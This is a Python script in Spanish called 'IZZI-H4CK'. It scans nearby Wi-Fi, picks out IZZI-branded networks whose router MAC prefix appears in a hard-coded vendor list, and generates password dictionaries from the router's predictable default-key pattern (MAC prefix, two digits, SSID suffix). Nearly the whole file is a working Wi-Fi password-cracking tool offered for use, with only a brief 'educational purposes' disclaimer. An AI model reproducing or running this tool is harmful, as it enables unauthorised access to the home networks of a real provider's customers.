

import time
from progress.bar import Bar
import pandas as pd
from wifi import Cell
from rich.console import Console
from colorama import Back, Fore, Style
import os.path
import netifaces





f_pass = ['DCA633', 'A405D6', 'F863D9', 'A4438C', 'A0E7AE', 'D46C6D', '2C00AB', '70DFF7', '1C937C', 'F8790A', 'E4F75B', 'B05DD4', 'A8705D', 'A0687E', '84BB69', '20F375', 'ACEC80', 'C005C2', '001DCE', 'E0B70A', 'C83FB4', '901ACA', '14ABF0', '306023', '903EAB', '001DD6', '001C12', '74E7C6', '00230B', '0026BA', '001AAD', '001404', '0025F1', '0025F2', '0024C1', '3C438E', '94CCB9', '0011AE', '001F7E', '001ADB', '0023A3', '002375', '00128A', '00D088', '000B06', '001180', '00159A', '0015A8', '0016B5', '001700', 'A47AA4', 'CC7D37', '74EAE8', '986B3D', '341FE4', '5CB066', '707630', '84E058', '00D037', '0026D9', '8496D8', 'A0C562', 'D0E54D', '446AB7', '00ACE0', '2CA17D', '98F7D7', 'F40E83', '20F19E', '5819F8', 'EC7097', '2C9569', 'B4F2E8', 'F0FCC8', 'A8F5DD', '948FCF', '1820D5', '88EF16', 'ACDB48', 'C863FC', '946269', '8C5A25', 'ACF8CC', '404C77', 'A897CD', '1005B1', '3C7A8A', '5465DE', 'F8EDA5', '207355', '1C1B68', '3C36E4', '083E0C', '407009', '94877C', 'E8892C', '5C571A', '8C7F3B', 'E83381', 'D40598', '78719C', '6CCA08', '601971', '0003E0', '000CE5', '001675', '0017E2', '40B7F3', '90B134', '20E564', '001596', '0015D0', '002641', '002493', '001E8D', '001B52', '0023ED', '0023A2', '0012C9', '001DBE', '001D6B', '001BDD', '002180', '00211E', 'A4ED4E', '64ED57', '001A77', '001A66', '001A1B', '00195E', '00192C', 'B077AC', 'B81619', 'C0C522', 'F8A097', '000E5C', '70B14E', '400D10', '5CE30E', '48D343', '1835D1', 'B0DAF9', '608CE6', 'BC2E48', '6402CB', '189C27', 'F82DC0', '704FB8', 'D4AB82', '6CA604', '5075F1', '109397', '80E540', 'ECA940', 'D404CD', '203D66', 'D40AA9', 'CC65AD', '789684', 'E8ED05', '8C09F4', '001DD2', '001DCD', '900DCB', 'E83EFC', '7CBFB1', '001311', '0019A6', '001626', '002136', '0050E3', '745612', '001ADE', '0023EE', '001371', '001E5A', '001CC1', '002636', '2C9E5F', '40FC89', 'E46449', 'A41588', '38700C', '044E5A', 'FC51A4', 'BC644B', '287AEE', '44AAF5', '80F503', 'A055DE', 'D42C0F', 'FC6FB7', 'FC8E7E', '003676', '7823AE', '105611', '18B81F', '984B4A', 'E8825B', '509551', 'F88B37', '240A63', '88964E', 'CC75E2', '748A0D', '14D4FE', 'E49F1E', '402B50', '705425', '8C61A3', 'FCAE34', 'F0AF85', '8871B1', 'C85261', '60D248', 'A49813', '98F781', '10868C', '384C90', '000FCC', 'D039B3', 'BCCAB5', '90C792', '5C8FE0', 'ACB313', '001DD3', '001DD0', '0015D1', '8461A0', '3CDFA9', '0CF893', '0000CA', '0015A4', '0015A3', '0015A2', '0015CE', 'F87B7A', '0023AF', '002395', '001CFB', '001FC4', '00152F', '707E43', '8096B1', '00E06F', '0019C0', '0014E8', '00149A', '0022B4', '002210', '0024A1', '002642', '0004BD', '000F9F', '00111A', '0017EE', 'C8AA21', 'DC4517', 'F80BBE', '5856E8', '641269', '28C87A', 'D82522', 'E0B7B1', '005094', '2C9924', 'E02202', '2C7E81', '4C38D8', 'D4B27A', '8C5BF0', '0CEAC9', '3C0461', '4434A7', '2C584F', '4C1265', '9CC8FC', 'D43FCB', '6092F5', 'C089AB', '14C03E', '0CB771', '786A1F', '2494CB', 'C09435', '50A5DC', '5860D8', 'BC5BD5', '484EFC', '6C639C', '44E137', '14CFE2', '6455B1', '0000C5', 'CCA462', '001DD4', '001DD5', '001DCF', '001DD1', '9C3426', '0015CF', '002374', '0018C0', '0018A4', '001E46', '001C11', '001784', '1C1448', '6CC1D2', '145BD1', '001225', '00909C', '00080E', '0024A0', '002495', '74F612', '002143', 'E48399', '3C754A', 'E86D52', '386BBB', '002040', 'A811FC', '94E8C5', '7085C6', '001CC3', '347A60', '54E2E0', '7C2634', '2C1DB8', 'E45740', '909D7D', 'B0935B', 'A89FEC', 'C0A00D', 'B083D6', 'F8F532']

  
  


def create_wordlist(ssid):
  i = 0
  bar1 = Bar("Generando:", max=len(f_pass)*100)
  while i<len(f_pass):
   archi1=open(rf"{os.getcwd()}/wordlists/{ssid}.txt","a+")
   for j in range(100):
    if(j<10):
     archi1.write(f_pass[i]+"0"+str(j)+ssid.split("-")[1]+'\n')
    else:
     archi1.write(f_pass[i]+str(j)+ssid.split("-")[1]+'\n')
    bar1.next()
   archi1.close()
   i=i+1
  bar1.finish()
  print(f"{Style.BRIGHT}{Fore.GREEN}Guardado: {os.getcwd()}/wordlists/{ssid}.txt")


def manual():
  print(f"\b {Style.BRIGHT}{Fore.YELLOW}[!] SSID es el nombre de la red. Ejemplos: IZZI-ABCD/IZZI-1234/IZZI-A1B2/IZZI-1A2B{Style.BRIGHT}{Fore.GREEN}")
  ssid = input("⎼⎼>Ingresa el SSID: ")
  
  if("IZZI-" in ssid):
    print(f"\b [+] El SSID es vulnerable{Style.BRIGHT}{Fore.GREEN}")
    input("Presiona [ENTER] para crear un diccionario...")
    create_wordlist(ssid)
  else:
    print(f"\n{Style.BRIGHT}{Fore.RED}[X] SSID No vulnerable!\n{Style.RESET_ALL}")
  
def vul_check():
  print(f"\b {Style.BRIGHT}{Fore.YELLOW}[!] BSSID es la direccion MAC de la red. Ejemplo: 90:00:4E:87:BF:3C{Style.BRIGHT}{Fore.GREEN}")
  bssid = input("⎼⎼>Ingresa el BSSID: ")
  if(bssid[:8].replace(":","") in f_pass):
    print(f"\b [+] El BSSID es vulnerable{Style.BRIGHT}{Fore.GREEN}")
    input("Presiona [ENTER] para ver si el SSID es vulnerable...")
    manual()
  else:
    print(f"\n{Style.BRIGHT}{Fore.RED}[X] BSSID No vulnerable!\n{Style.RESET_ALL}")

def wifi_scan():
  
  [print(f"\b[{str(a)}] {netifaces.interfaces()[a]}") for a in range(len(netifaces.interfaces()))]
  print(f"\n {Style.BRIGHT}{Fore.YELLOW}[!] La interfaz no puede estar en modo monitor")
  interFace_select = input(F"\n{Style.BRIGHT}{Fore.GREEN}⎼⎼>Interface:")
  try:
   time.sleep(5)
   cells = Cell.all(netifaces.interfaces()[int(interFace_select)])
   time.sleep(5)
   vul_cell = []
   for b in cells:
    vul_wifi = b.address[:8].replace(":","")
    if "IZZI-" in b.ssid and vul_wifi in f_pass:
     vul_cell.append([b.ssid,b.address,b.channel,b.quality,b.encryption_type])
   df = pd.DataFrame(vul_cell, columns=["ssid","address","channel","signal","encrypt"])
   
   
   print("-------------------- REDES VULNERABLES --------------------")
   print(f"{df}",end="\n",flush=True)
   print("-----------------------------------------------------------")
   
   select_red = input("\n⎼⎼>Seleccionar red:")
   create_wordlist(vul_cell[int(select_red)][0])
   
   
  except:
    print(f"\n{Style.BRIGHT}{Fore.RED}[X] Elige otra interfaz!\n")




def main():
 
 Console().clear()
 print(Style.BRIGHT, Fore.GREEN)
 print(f"""
\b┌─────────────────────────────────────────┐
│ [IZZI-H4CK - {Style.DIM}{Fore.BLUE}ugaldev{Style.RESET_ALL}{Style.BRIGHT}{Fore.GREEN}]                   │
│                                         │
│ Creador de diccionarios para redes IZZI │
│                                         │
│ {Style.DIM}{Fore.WHITE}https://github.com/ugaldev/izzi-h4ck{Style.RESET_ALL}{Style.BRIGHT}{Fore.GREEN}    │
│                                         │
└─────────────────────────────────────────┘
 """)
 print(f"""\b{Style.DIM}{Fore.BLUE}Nota: Este script es para fines educativos, no me hago responsable del mal uso
      que se le de a los diccionarios generados con este script{Style.RESET_ALL}{Style.BRIGHT}{Fore.GREEN}\n""")
 
 print(f"""
 Opciones:
 [1] Buscar redes vulnerables
 [2] Ingresar red manualmente
 """)
 menu_opc = input("⎼⎼>Opcion: ")
 if(menu_opc == "1"):
   wifi_scan()
 elif(menu_opc == "2"):
   vul_check()
 else:
   exit()
 
    
  
if __name__ == "__main__":
  main()
  
  
